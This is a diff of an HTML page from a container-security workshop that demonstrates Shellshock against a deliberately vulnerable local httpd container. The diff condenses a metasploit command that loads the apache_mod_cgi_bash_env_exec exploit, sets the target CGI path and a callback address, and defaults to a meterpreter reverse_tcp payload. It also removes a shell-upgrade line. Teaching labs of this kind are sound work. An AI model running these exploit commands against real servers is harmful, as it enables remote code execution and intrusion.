@@ -151,7 +151,7 @@
     <a class="nav-link" href="compose-container.html">Multi containers with Podman</a>
   </li>
   <li class="nav-item" data-depth="2">
-    <a class="nav-link" href="deploy-container.html">OpenShift Sandbox</a>
+    <a class="nav-link" href="deploy-container.html">Containers and OpenShift</a>
   </li>
 </ul>
   </li>
@@ -213,7 +213,7 @@
 </div>
 <div class="paragraph">
 <p><span class="image right"><img src="_images/shellshock-logo.png" alt="shellshock logo" width="50"></span>
-Our <code>quay.io/mhildenb/container-workshop-httpd:0.0.5</code> has a huge vulnerability in it that is further excerbated by the manner in which we&#8217;ve run our container.  The vulnerability is the (in)famous <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock vulnerability</a></p>
+Our <code>quay.io/mhildenb/container-workshop-httpd:0.0.5</code> has a huge vulnerability in it that is further excerbated by the manner in which we&#8217;ve run our container.  The vulnerability is the (in)famous <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="noopener">Shellshock vulnerability</a></p>
 </div>
 <div class="olist arabic">
 <ol class="arabic">
@@ -247,26 +247,68 @@ Our <code>quay.io/mhildenb/container-workshop-httpd:0.0.5</code> has a huge vuln
 <p>We are going to run metasploit as a non-root user in another shell.  Split your terminal to open a new, non-root, shell</p>
 </li>
 <li>
-<p>Next we need to gather some information about the instance that we will (soon) feed to <code>metasploit</code>.  Run the following command to store the ip address of your instance</p>
-<div class="listingblock console-input">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">LHOST=$(dig +short myip.opendns.com @resolver1.opendns.com)</code></pre>
-</div>
-</div>
-</li>
-<li>
 <p>Next, start up metasploit in your terminal by running the following command:</p>
 <div class="listingblock console-input">
 <div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">msfconsole</code></pre>
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">msfconsole \
+    -x \<i class="conum" data-value="1"></i><b>(1)</b>
+"use multi/http/apache_mod_cgi_bash_env_exec; <i class="conum" data-value="2"></i><b>(2)</b>
+set RHOST 127.0.0.1; <i class="conum" data-value="3"></i><b>(3)</b>
+set RPORT 8081; <i class="conum" data-value="4"></i><b>(4)</b>
+set LHOST $(dig +short myip.opendns.com @resolver1.opendns.com); <i class="conum" data-value="5"></i><b>(5)</b>
+set targeturi /cgi-bin/log-visitor.sh" <i class="conum" data-value="6"></i><b>(6)</b></code></pre>
 </div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>The <code>-x</code> option allows us to pass commands directly into metasploit (see following explanations of each).  We use this to save setup time</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="2"></i><b>2</b></td>
+<td>This is a metasploit module that plugs into the console.  There is a whole library of modules that are used with metasploit.  This one specifically targets the shellshock vulnerability via Apache&#8217;s cgi-bin support</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="3"></i><b>3</b></td>
+<td>This is the address of the server (which we&#8217;re running locally in a container)</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="4"></i><b>4</b></td>
+<td>The port the container is listening on (in our case the port that is forwarded to the container via the <code>-p</code> option to <code>podman run</code>)</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="5"></i><b>5</b></td>
+<td>The public ip address of the VM instance (as reported by <code>dig</code>).  This is necessary for how metasploit works</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="6"></i><b>6</b></td>
+<td>The target URL of a cgi-bin script.  Those that are astute might recognize this as the cgi-bin endpoint of the guestbook page (<code>hello.html</code>)</td>
+</tr>
+</table>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>If asked if you want to setup a new database, answer no</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Would you like to use and setup a new database (recommended)?</pre>
+</div>
+</div>
+</td>
+</tr>
+</table>
 </div>
 </li>
 <li>
-<p>When prompted, decline to load the metasploit DB</p>
-</li>
-<li>
-<p>When it&#8217;s done initializing, you should see output something like this (ASCII art will vary)</p>
+<p>When it&#8217;s done initializing, you should see output something like this (ASCII art, "tip", and LHOST will vary)</p>
 <div class="listingblock console-output">
 <div class="content">
 <pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">** Metasploit Framework Initial Setup Complete **
@@ -312,47 +354,16 @@ Our <code>quay.io/mhildenb/container-workshop-httpd:0.0.5</code> has a huge vuln
 + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 8 evasion                                       ]
 
-Metasploit tip: To save all commands executed since start up
-to a file, use the makerc command
+Metasploit tip: When in a module, use back to go
+back to the top level prompt
 
-msf6 &gt;</code></pre>
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+RHOST =&gt; 127.0.0.1
+RPORT =&gt; 8081
+LHOST =&gt; 54.79.241.48
+targeturi =&gt; /cgi-bin/log-visitor.sh
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;</code></pre>
 </div>
-</div>
-</li>
-<li>
-<p>Next we need to configure some details for metasploit to be able to exploit our container</p>
-<div class="listingblock console-input">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">use multi/http/apache_mod_cgi_bash_env_exec <i class="conum" data-value="1"></i><b>(1)</b>
-set RHOST 127.0.0.1 <i class="conum" data-value="2"></i><b>(2)</b>
-set RPORT 8081 <i class="conum" data-value="3"></i><b>(3)</b>
-set LHOST ${LHOST} <i class="conum" data-value="4"></i><b>(4)</b>
-set targeturi /cgi-bin/log-visitor.sh <i class="conum" data-value="5"></i><b>(5)</b></code></pre>
-</div>
-</div>
-<div class="colist arabic">
-<table>
-<tr>
-<td><i class="conum" data-value="1"></i><b>1</b></td>
-<td>This is a metasploit module that plugs into the console.  There is a whole library of modules that are used with metasploit.  This one specifically targets the shellshock vulnerability via Apache&#8217;s cgi-bin support</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="2"></i><b>2</b></td>
-<td>This is the address of the server (which we&#8217;re running locally in a container)</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="3"></i><b>3</b></td>
-<td>The port the container is listening on (in our case the port that is forwarded to the container via the <code>-p</code> option to <code>podman run</code>)</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="4"></i><b>4</b></td>
-<td>The ip address of the VM instance</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="5"></i><b>5</b></td>
-<td>The target URL of a cgi-bin script.  Those that are astute might recognize this as the cgi-bin endpoint of the guestbook page (<code>hello.html</code>)</td>
-</tr>
-</table>
 </div>
 </li>
 <li>
@@ -820,11 +831,11 @@ drwxr-xr-x.  20 root root  278 May 28 08:44 var</code></pre>
 </div>
 <div class="sect2">
 <h3 id="_better_use_of_selinux"><a class="anchor" href="#_better_use_of_selinux"></a>Better use of SELinux</h3>
-<div class="listingblock console-input">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">shell
-/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+<div class="paragraph">
+<p><em>UNFINISHED</em></p>
 </div>
+<div class="paragraph">
+<p>When our container is running on Red Hat Enterprise Linux, we can use Security Enhanced Linux (or SELinux) to further control the container&#8217;s access to files on our volume</p>
 </div>
 </div>
 <div class="sect2">
@@ -1269,54 +1280,6 @@ Evaluation done.</code></pre>
 </div>
 <div class="paragraph">
 <p>This is where <code>buildah</code> comes in, which we&#8217;ll explore next.</p>
-</div>
-</div>
-<div class="sect2">
-<h3 id="_compliance_scanning_with_oscap_podman"><a class="anchor" href="#_compliance_scanning_with_oscap_podman"></a>Compliance Scanning with <code>oscap-podman</code></h3>
-<div class="admonitionblock warning">
-<table>
-<tr>
-<td class="icon">
-<i class="fa icon-warning" title="Warning"></i>
-</td>
-<td class="content">
-<div class="paragraph">
-<p>This section is unfinished and likely to be cut from the final workshop</p>
-</div>
-</td>
-</tr>
-</table>
-</div>
-<div class="olist arabic">
-<ol class="arabic">
-<li>
-<p>Install compliance stuff (FIXME: move this to ansible)</p>
-<div class="listingblock console-input">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">yum -y install scap-security-guide</code></pre>
-</div>
-</div>
-</li>
-<li>
-<p>Run the xccdf scan</p>
-<div class="listingblock console-input">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">oscap-podman e1fc6588d2cc xccdf eval --report ~%USER%/compliance-report.html --profile pci-dss /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml</code></pre>
-</div>
-</div>
-</li>
-<li>
-<p>View vuln report in browser</p>
-<div class="listingblock console-input">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash"><a href="file:///home/student1/compliance-report.html" class="bare">file:///home/student1/compliance-report.html</a></code></pre>
-</div>
-</div>
-</li>
-<li>
-<p>Take a look at prevent login to accounts with empty passwords</p>
-</li>
-</ol>
 </div>
 </div>
 </div>
